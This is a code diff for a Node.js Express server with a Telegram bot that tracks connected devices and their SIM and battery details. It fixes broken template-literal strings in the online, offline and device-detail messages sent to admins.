@@ -68,8 +68,7 @@ app.post('/connect', (req, res) => {
   devices.set(uuid, deviceData);
 
   if (wasOffline) {
-    const message = `🟢 *Device Connected*
-${formatDevice(deviceData)}`;
+    const message = `🟢 *Device Connected*\n${formatDevice(deviceData)}`;
     ADMIN_IDS.forEach(id => bot.sendMessage(id, message, { parse_mode: 'Markdown' }));
   }
 
@@ -197,7 +196,7 @@ Choose an action:`, {
       const online = (Date.now() - (device.lastSeen || 0) < 70000);
       const infoMsg = [
         `*Device Details for ${device.Device}*`,
-        `*UUID*: `${uuid}``,
+        `*UUID*: ${uuid}`,
         `*SIM 1*: ${device.sim1 || 'N/A'}`,
         `*SIM 2*: ${device.sim2 || 'N/A'}`,
         `*Battery*: ${device.battery || 'N/A'}`,
@@ -314,8 +313,7 @@ setInterval(() => {
     // Only notify if the state changes from online to offline
     if (isOffline && device.notifiedState === 'online') {
       device.notifiedState = 'offline';
-      const message = `🔴 *Device Offline*
-${formatDevice(device)}`;
+      const message = `🔴 *Device Offline*\n${formatDevice(device)}`;
       ADMIN_IDS.forEach(id => bot.sendMessage(id, message, { parse_mode: 'Markdown' }));
     }
   }
